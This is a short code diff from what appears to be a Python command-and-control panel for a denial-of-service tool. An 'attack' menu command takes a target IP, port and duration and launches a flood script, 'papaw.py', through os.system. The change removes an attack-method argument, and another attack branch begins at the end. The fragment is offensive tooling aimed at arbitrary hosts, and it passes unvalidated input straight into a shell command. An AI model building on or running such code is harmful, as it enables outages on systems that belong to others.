@@ -332,11 +332,10 @@ def main():
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
                 time = cnc.split()[3]
-                methods = cnc.split()[4]
-                os.system(f'python3 papaw.py {ip} {port} {time} JOKER')
+                os.system(f'python3 papaw.py {ip} {port} {time}')
             except IndexError:
-                print('Usage: attack <ip> <port> <time> <methods>')
-                print('Example: attack 1.1.1.1 80 60 joker')
+                print('Usage: attack <ip> <port> <time>')
+                print('Example: attack 1.1.1.1 80 60')
 
         elif "etek" in cnc:
             try:
